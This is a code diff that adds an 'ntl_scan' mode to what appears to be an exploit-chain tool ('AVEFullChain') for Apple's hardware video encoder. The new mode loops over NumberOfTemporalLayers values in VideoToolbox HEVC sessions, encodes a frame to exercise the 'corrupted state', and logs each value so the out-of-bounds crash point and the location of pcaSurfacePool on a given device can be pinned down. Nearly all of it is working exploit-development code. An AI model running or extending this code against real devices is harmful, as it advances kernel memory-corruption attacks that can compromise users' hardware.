@@ -11202,6 +11202,98 @@ vps_cd_done:
 
         rlog("\n=== NTL_OOB complete ===\n");
 
+    } else if (strcmp(mode, "ntl_scan") == 0) {
+        /*
+         * ntl_scan — Scan NTL values to find crash point on this device
+         *
+         * The pClient struct size varies by hardware (A20 Pro may differ from
+         * the panicIDK analysis). Scan NTL values in steps to find where
+         * pcaSurfacePool[0] lives on THIS device.
+         *
+         * Each iteration: create session → set NTL → prepare → teardown
+         * If a panic occurs, the LAST LOGGED NTL is 1 less than the crash point.
+         *
+         * Usage: ntl_scan [start] [end] [step]
+         *   e.g., ntl_scan 16000 32000 500  (coarse scan)
+         *         ntl_scan 20000 20100 1    (fine scan after coarse)
+         */
+        int start = (argc > 2) ? atoi(argv[2]) : 16000;
+        int end = (argc > 3) ? atoi(argv[3]) : 32000;
+        int step = (argc > 4) ? atoi(argv[4]) : 500;
+        if (start < 1) start = 1;
+        if (end < start) end = start + 1000;
+        if (step < 1) step = 1;
+        if (end > 65535) end = 65535;
+
+        int vw = 192, vh = 192;
+        rlog("=== NTL_SCAN: Find crash point for A20 Pro ===\n");
+        rlog("Range: %d to %d, step=%d, res=%dx%d\n", start, end, step, vw, vh);
+        rlog("If device reboots, last logged NTL is just below crash point.\n\n");
+
+        int tested = 0, survived = 0;
+        for (int ntl = start; ntl <= end; ntl += step) {
+            rlog("NTL=%5d: ", ntl);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) { rlog("create=%d SKIP\n", (int)cs); tested++; continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+
+            if (sp != noErr) {
+                rlog("set=%d REJECTED\n", (int)sp);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++;
+                continue;
+            }
+
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (prep != noErr) {
+                rlog("prep=%d FAIL\n", (int)prep);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++;
+                continue;
+            }
+
+            /* Encode one frame to exercise the corrupted state */
+            g_encode_done = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *base = CVPixelBufferGetBaseAddress(pb);
+                if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                for (int w = 0; w < 30 && !g_encode_done; w++) usleep(5000);
+                CVPixelBufferRelease(pb);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            rlog("OK\n");
+            tested++;
+            survived++;
+            usleep(10000);
+        }
+
+        rlog("\n=== NTL_SCAN summary ===\n");
+        rlog("Tested: %d, survived: %d\n", tested, survived);
+        rlog("All survived → pool pointers beyond NTL=%d\n", end);
+        rlog("Next: try higher range or smaller step near boundary.\n");
+        rlog("\n=== NTL_SCAN complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
